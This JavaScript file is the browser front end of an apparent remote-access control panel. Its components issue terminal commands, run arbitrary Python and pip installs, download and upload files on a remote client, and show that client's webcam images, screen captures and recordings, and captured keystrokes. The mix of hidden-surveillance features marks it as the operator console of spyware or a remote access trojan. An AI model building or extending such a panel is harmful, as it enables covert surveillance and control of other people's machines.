const componentBtns = document.querySelectorAll(`[data-component]`)
const componentForms = document.querySelectorAll(`.component-form`)
const componentOutputs = document.querySelectorAll(`.component-output`)
const sidebar = document.querySelector("aside")
const clientStatus = document.querySelector("#client-status")
const cwdText = document.querySelectorAll(".cwd-text")
const lastOnlineText = document.querySelector("#lastOnline-text")
const lastOfflineText = document.querySelector("#lastOffline-text")
const filemanagerUpload = document.querySelector("#filemanager-upload")
const filesTable = document.querySelector("#files-table")
const pythonStatus = document.querySelector("#python-status")
const pythonPid = document.querySelector("#python-pid")

const indexComponent = new URLSearchParams(window.location.search).get("component") || "terminal"
const socket = io("", {
    secure: true,
    transports: ["websocket"],
    auth: {
        id: window.__TARK_DATA__.id,
        clientType: "browser"
    }
})

// === Component Switcher ===
function switchComponent(btn, form, output) {
    componentBtns.forEach(b => b.classList.remove("has-background-grey-dark"))
    componentForms.forEach(f => f.classList.remove("active"))
    componentOutputs.forEach(o => o.classList.remove("active"))

    btn.classList.add("has-background-grey-dark")
    form.classList.add("active")
    output.classList.add("active")
}

function updateCwdText(cwd) {
    cwdText.forEach(element => {
        if (["INPUT", "TEXTAREA"].includes(element.tagName)) {
            element.value = cwd
        } else {
            element.innerText = cwd
        }
    })
}

async function sendCommand(data) {
    try {
        const response = await fetch(location.href, {
            method: "POST",
            body: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json"
            }
        })

        const jsonData = await response.json()
        const outputContainer = document.querySelector(`.${data.type}-output`)
        if (!jsonData.ack) {
            addCommandOutput(outputContainer, jsonData.msg)
        }

        return jsonData.ack
    } catch (error) {
        return {
            ack: false,
            msg: error.message,
        }
    }
}

function addCommandOutput(container, message) {
    const wrapper = document.createElement("div")
    wrapper.className = "my-2 is-flex is-gap-1 is-align-items-center"
    wrapper.innerHTML = `
        <code class="output-str has-text-grey-lighter"></code>
        <code class="time-str has-text-info"></code>
        <hr class="m-0 is-flex-grow-1"> 
    `
    wrapper.querySelector(".output-str").innerText = message
    wrapper.querySelector(".time-str").innerText = new Date().toLocaleString()
    container.appendChild(wrapper)

    container.scrollTo({
        top: container.scrollHeight,
        behavior: "smooth"
    })
}

function renderFilesTable(outputContainer, rawData) {
    const allFiles = []
    const { files, folders } = JSON.parse(rawData)
    const tbody = document.createElement("tbody")

    allFiles.push({
        isFile: false,
        name: "..",
    })

    folders.forEach(folder => {
        allFiles.push({
            isFile: false,
            name: folder,
        })
    })

    files.forEach(file => {
        allFiles.push({
            isFile: true,
            name: file,
        })
    })

    allFiles.forEach(file => {
        const tr = document.createElement("tr")
        tr.innerHTML = `
            <td class="download-file-item">
                <div class="is-flex is-gap-1 is-align-items-center is-clickable">
                    <span class="icon">
                        <span class="mdi ${file.isFile ? 'mdi-file has-text-grey' : 'mdi-folder has-text-warning'}"></span>
                    </span>
                    <span>${file.name}</span>
                </div>
            </td>
        `

        const downloadBtn = tr.querySelector(".download-file-item")
        downloadBtn.addEventListener("click", async () => {
            if (file.isFile) {
                addCommandOutput(outputContainer, `[Download]::[${file.name}]`)
            } else {
                requestAnimationFrame(() => {
                    filesTable.scrollTo({
                        top: 0,
                        behavior: "smooth"
                    })
                })
            }

            await sendCommand({
                type: "filemanager",
                action: "download",
                value: file.name,
            })
        })

        tbody.appendChild(tr)
    })

    filesTable.innerHTML = ""
    filesTable.appendChild(tbody)
}

function formatFormData(data) {
    if (data.type === "python") {
        if (data.pipArgs && data.pipArgs.trim().length !== 0) {
            return {
                type: "python",
                action: "pip",
                pipArgs: data.pipArgs,
            }
        }

        if (data.action === "kill") {
            return {
                type: "python",
                action: data.action
            }
        }

        if (data.code.trim().length === 0) {
            return alert("Code is empty")
        }

        return {
            type: "python",
            action: data.action,
            code: data.code,
        }
    }

    return data
}

function formatFormOutput(data) {
    let outputObj = data
    if (data.type === "python") {
        if (data.pipArgs && data.pipArgs.trim().length !== 0) {
            outputObj = {
                type: "python",
                action: "pip",
                pipArgs: data.pipArgs,
            }
        } else {
            outputObj = {
                type: "python",
                action: data.action,
                code: "PYTHON_CODE",
            }
        }
    }

    return Object.values(outputObj).map(value => `[${value}]`)
        .filter(Boolean)
        .join("::")
}

componentBtns.forEach(element => {
    const componentName = element.dataset.component
    const form = document.querySelector(`.${componentName}-form`)
    const output = document.querySelector(`.${componentName}-output`)

    if (componentName === indexComponent) {
        switchComponent(element, form, output)
    }

    element.addEventListener("click", () => {
        switchComponent(element, form, output)

        if (window.innerWidth < 768) {
            sidebar.classList.remove("active")
        }
    })
})

document.querySelectorAll(".menu-button").forEach(element => {
    element.addEventListener("click", () => {
        sidebar.classList.toggle("active")
    })
})

componentForms.forEach(form => {
    form.addEventListener("submit", async (e) => {
        e.preventDefault()
        const formData = new FormData(form)
        const data = formatFormData(Object.fromEntries(formData.entries()))
        if (!data) return

        const outputContainer = document.querySelector(`.${data.type}-output`)
        addCommandOutput(outputContainer, formatFormOutput(data))

        const state = await sendCommand(data)
        if (state) {
            form.querySelectorAll(`[clear]`).forEach(element => {
                element.value = ""
            })
        }
    })
})

filemanagerUpload.addEventListener("click", async () => {
    const url = prompt("filename@URL")
    if (!url) return
    const outputContainer = document.querySelector(`.filemanager-output`)
    addCommandOutput(outputContainer, `[Upload]::[${url}]`)

    await sendCommand({
        type: "filemanager",
        action: "upload",
        value: url,
    })
})

// === Socket Event Listeners ===
socket.on("connect", () => {
    console.log("Browser Connected")
})

socket.on("client-ping", data => {
    console.log("Client ping", data)
    if (data.id === window.__TARK_DATA__.id) {
        if (data.isOnline) {
            lastOnlineText.innerText = data.lastOnline
            clientStatus.classList.remove("has-text-danger")
            clientStatus.classList.add("has-text-primary")
        } else {
            lastOfflineText.innerText = data.lastOffline
            clientStatus.classList.remove("has-text-primary")
            clientStatus.classList.add("has-text-danger")
        }
    }
})

socket.on("receiver", data => {
    console.log("Received data:", data)
    if (!data.type) return
    const outputContainer = document.querySelector(`.${data.type}-output`)

    // if it has cwd
    if (data.cwd) {
        updateCwdText(data.cwd)
    }

    if (data.type === "terminal") {
        const wrapper = document.createElement("div")
        wrapper.className = "line has-text-grey-light"
        wrapper.innerText = data.output
        outputContainer.appendChild(wrapper)
    }

    else if (data.type === "webcam") {
        if (data.url) {
            const img = document.createElement("img")
            img.src = data.url
            outputContainer.appendChild(img)
        } else {
            addCommandOutput(outputContainer, data.output)
        }
    }

    else if (data.type === "display") {
        if (data.url) {
            const tag = data.url.endsWith(".mp4") ? "video" : "img"
            const element = document.createElement(tag)
            element.src = data.url
            outputContainer.appendChild(element)

            if (tag === "video") {
                element.controls = true
            }
        } else {
            addCommandOutput(outputContainer, data.output)
        }
    }

    else if (data.type === "keyboard") {
        const code = document.createElement("code")
        code.className = "m-1 is-inline-block"
        code.innerText = data.output
        outputContainer.appendChild(code)
    }

    else if (data.type === "filemanager") {
        if (data.cwd) {
            renderFilesTable(outputContainer, data.output)
        }

        else if (data.url) {
            const a = document.createElement("a")
            a.className = "is-block my-2"
            a.href = data.url
            a.target = "_blank"
            a.innerText = `File: ${data.url}`
            outputContainer.appendChild(a)
        }

        else {
            addCommandOutput(outputContainer, data.output)
        }
    }

    else if (data.type === "python") {
        const wrapper = document.createElement("div")
        wrapper.className = "line has-text-grey-light"
        wrapper.innerText = data.output
        outputContainer.appendChild(wrapper)

        if (data.pid != null) {
            pythonPid.innerText = data.pid
            pythonStatus.innerText = "Running"
        } else {
            pythonStatus.innerText = "-"
            pythonPid.innerText = "-"
        }
    }

    else {
        addCommandOutput(outputContainer, data.output)
    }

    outputContainer.scrollTo({
        top: outputContainer.scrollHeight,
        behavior: "smooth"
    })
})